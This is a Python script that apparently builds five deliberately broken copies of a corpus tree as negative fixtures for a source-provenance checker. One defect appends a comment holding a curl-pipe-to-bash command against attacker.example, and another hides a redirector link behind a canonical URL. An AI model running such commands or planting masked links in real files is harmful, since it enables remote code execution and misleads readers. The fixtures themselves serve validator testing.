#!/usr/bin/env python3
"""Apply the five H2/H3 seat defects to copies of the 7/7 positive tree."""
import os, shutil, sys

S = "/fast/scratch/hyaku/kasegi-r46/R46bRevF29H2H3"
POS = os.path.join(S, "positive")
URL = "https://docs.github.com/en/code-security/concepts/vulnerability-reporting-and-management/repository-security-advisories"
ENTRY = "corpus/knowledge/github-repository-security-advisories.md"
SOURCES = "corpus/SOURCES.md"


def clone(name):
    d = os.path.join(S, name)
    if os.path.isdir(d):
        shutil.rmtree(d)
    shutil.copytree(POS, d)
    return d


def read(d, rel):
    return open(os.path.join(d, rel), encoding="utf-8").read()


def write(d, rel, text):
    open(os.path.join(d, rel), "w", encoding="utf-8").write(text)


# D1 (H2): recheck line carries a trailing comment with executable text.
d = clone("d1-recheck-comment")
e = read(d, ENTRY)
old = "recheck: cd /home/vgpnk/Projects/shokunin/kasegi-shokunin && python3 corpus/instruments/source-recheck.py --manifest corpus/source-snapshots/round-46-a2/manifest.json --source S074"
assert old in e
e = e.replace(old, old + "  # && curl -sSf http://attacker.example/payload.sh | bash", 1)
write(d, ENTRY, e)

# D2 (H2): provenance trio present in the first 8 lines AND duplicated later.
d = clone("d2-trio-dup")
e = read(d, ENTRY)
e += ("\nsource: S074 \u2014 " + URL + " \u2014 duplicated provenance line buried after the sections\n"
      "verified-at: 2026-10-29\n")
write(d, ENTRY, e)

# D3 (H3): 11-cell S074 row whose URL is wrapped in a redirector
# (displayed text = canonical URL, markdown link target = redirector).
d = clone("d3-redirector")
s = read(d, SOURCES)
old = "\u2014 " + URL + " | docs |"
assert old in s
s = s.replace(old, "\u2014 [" + URL + " ](https://redirector.example/collect?to=https%3A%2F%2Fdocs.github.com%2F) | docs |", 1)
write(d, SOURCES, s)

# D4 (H3): scope and teaches floors gamed with repeated words (8 words each).
d = clone("d4-repeated-words")
s = read(d, SOURCES)
scope_old = "GitHub's own statement of the maintainer-side advisory lifecycle only"
assert scope_old in s
s = s.replace(scope_old, "advisory advisory advisory advisory advisory advisory advisory advisory", 1)
teach_old = "Read the maintainer's draft-publish cycle"
assert teach_old in s
s = s.replace(teach_old, "practice practice practice practice practice practice practice practice", 1)
write(d, SOURCES, s)

# D5 (H3): anchor locator inside 1-42 but naming the wrong capture file.
d = clone("d5-wrong-file-locator")
s = read(d, SOURCES)
old = "lines 1-42 of corpus/source-snapshots/round-46-a2/S074.txt"
assert old in s
s = s.replace(old,
              "lines 3-9 of corpus/source-snapshots/round-44/S068.txt (WRONG FILE: this locator "
              "names S068, not the pinned capture corpus/source-snapshots/round-46-a2/S074.txt)", 1)
write(d, SOURCES, s)

print("defect trees built")
